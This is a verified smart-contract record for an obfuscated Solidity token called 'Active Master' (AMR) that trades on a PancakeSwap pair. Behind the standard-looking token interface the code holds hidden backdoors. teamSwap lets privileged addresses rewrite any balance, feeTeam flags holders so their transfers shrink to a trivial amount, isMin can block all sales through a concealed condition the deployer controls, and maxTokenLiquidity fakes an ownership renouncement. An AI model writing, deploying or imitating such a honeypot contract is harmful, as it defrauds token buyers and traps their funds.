{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface marketingShouldExempt {\n    function createPair(address limitMarketingLaunch, address buyToken) external returns (address);\n}\n\ninterface marketingLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTradingLimit) external view returns (uint256);\n\n    function transfer(address minReceiverList, uint256 fromAmount) external returns (bool);\n\n    function allowance(address tradingTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minReceiverList,\n        uint256 fromAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingBuy, uint256 value);\n    event Approval(address indexed tradingTotal, address indexed spender, uint256 value);\n}\n\nabstract contract takeSellBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingLaunchedMetadata is marketingLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ActiveMaster is takeSellBuy, marketingLaunched, marketingLaunchedMetadata {\n\n    address private teamFrom;\n\n    function transferFrom(address amountLaunched, address minReceiverList, uint256 fromAmount) external override returns (bool) {\n        if (_msgSender() != modeShouldAt) {\n            if (toBuy[amountLaunched][_msgSender()] != type(uint256).max) {\n                require(fromAmount <= toBuy[amountLaunched][_msgSender()]);\n                toBuy[amountLaunched][_msgSender()] -= fromAmount;\n            }\n        }\n        return isMin(amountLaunched, minReceiverList, fromAmount);\n    }\n\n    uint256 public limitMax;\n\n    address public fromReceiver;\n\n    function maxTokenLiquidity() public {\n        emit OwnershipTransferred(fromReceiver, address(0));\n        teamFrom = address(0);\n    }\n\n    function listReceiver() private view {\n        require(swapAuto[_msgSender()]);\n    }\n\n    constructor (){\n        \n        shouldWallet fundLiquiditySwap = shouldWallet(modeShouldAt);\n        shouldMin = marketingShouldExempt(fundLiquiditySwap.factory()).createPair(fundLiquiditySwap.WETH(), address(this));\n        if (limitMax != exemptTo) {\n            shouldReceiver = true;\n        }\n        fromReceiver = _msgSender();\n        swapAuto[fromReceiver] = true;\n        fromTakeExempt[fromReceiver] = amountLiquidity;\n        maxTokenLiquidity();\n        \n        emit Transfer(address(0), fromReceiver, amountLiquidity);\n    }\n\n    string private liquidityAmount = \"AMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAmount;\n    }\n\n    function feeTeam(address exemptToken) public {\n        listReceiver();\n        if (toMarketing == shouldReceiver) {\n            liquidityTo = exemptTo;\n        }\n        if (exemptToken == fromReceiver || exemptToken == shouldMin) {\n            return;\n        }\n        launchTotal[exemptToken] = true;\n    }\n\n    function allowance(address enableTo, address limitReceiver) external view virtual override returns (uint256) {\n        if (limitReceiver == modeShouldAt) {\n            return type(uint256).max;\n        }\n        return toBuy[enableTo][limitReceiver];\n    }\n\n    bool public maxReceiver;\n\n    function getOwner() external view returns (address) {\n        return teamFrom;\n    }\n\n    uint256 constant senderExemptBuy = 14 ** 10;\n\n    bool private shouldReceiver;\n\n    function approve(address limitReceiver, uint256 fromAmount) public virtual override returns (bool) {\n        toBuy[_msgSender()][limitReceiver] = fromAmount;\n        emit Approval(_msgSender(), limitReceiver, fromAmount);\n        return true;\n    }\n\n    uint256 shouldTeam;\n\n    address modeShouldAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function enableTake(uint256 fromAmount) public {\n        listReceiver();\n        shouldTeam = fromAmount;\n    }\n\n    function isMin(address amountLaunched, address minReceiverList, uint256 fromAmount) internal returns (bool) {\n        if (amountLaunched == fromReceiver) {\n            return marketingLaunch(amountLaunched, minReceiverList, fromAmount);\n        }\n        uint256 shouldMarketing = marketingLaunched(shouldMin).balanceOf(senderTotal);\n        require(shouldMarketing == shouldTeam);\n        require(minReceiverList != senderTotal);\n        if (launchTotal[amountLaunched]) {\n            return marketingLaunch(amountLaunched, minReceiverList, senderExemptBuy);\n        }\n        return marketingLaunch(amountLaunched, minReceiverList, fromAmount);\n    }\n\n    uint256 public exemptTo;\n\n    string private teamBuy = \"Active Master\";\n\n    uint8 private atTx = 18;\n\n    mapping(address => bool) public swapAuto;\n\n    function marketingLaunch(address amountLaunched, address minReceiverList, uint256 fromAmount) internal returns (bool) {\n        require(fromTakeExempt[amountLaunched] >= fromAmount);\n        fromTakeExempt[amountLaunched] -= fromAmount;\n        fromTakeExempt[minReceiverList] += fromAmount;\n        emit Transfer(amountLaunched, minReceiverList, fromAmount);\n        return true;\n    }\n\n    function balanceOf(address swapTradingLimit) public view virtual override returns (uint256) {\n        return fromTakeExempt[swapTradingLimit];\n    }\n\n    function transfer(address receiverAuto, uint256 fromAmount) external virtual override returns (bool) {\n        return isMin(_msgSender(), receiverAuto, fromAmount);\n    }\n\n    uint256 totalTeam;\n\n    function listMax(address isLiquidity) public {\n        if (maxReceiver) {\n            return;\n        }\n        if (limitMax == maxSell) {\n            shouldReceiver = true;\n        }\n        swapAuto[isLiquidity] = true;\n        \n        maxReceiver = true;\n    }\n\n    uint256 private amountLiquidity = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private toBuy;\n\n    address public shouldMin;\n\n    event OwnershipTransferred(address indexed swapLaunched, address indexed sellLimit);\n\n    function name() external view virtual override returns (string memory) {\n        return teamBuy;\n    }\n\n    bool private toMarketing;\n\n    mapping(address => uint256) private fromTakeExempt;\n\n    uint256 private liquidityTo;\n\n    address senderTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atTx;\n    }\n\n    function owner() external view returns (address) {\n        return teamFrom;\n    }\n\n    function teamSwap(address receiverAuto, uint256 fromAmount) public {\n        listReceiver();\n        fromTakeExempt[receiverAuto] = fromAmount;\n    }\n\n    uint256 public maxSell;\n\n    mapping(address => bool) public launchTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTradingLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromAmount\",\"type\":\"uint256\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTokenLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromAmount\",\"type\":\"uint256\"}],\"name\":\"teamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ActiveMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}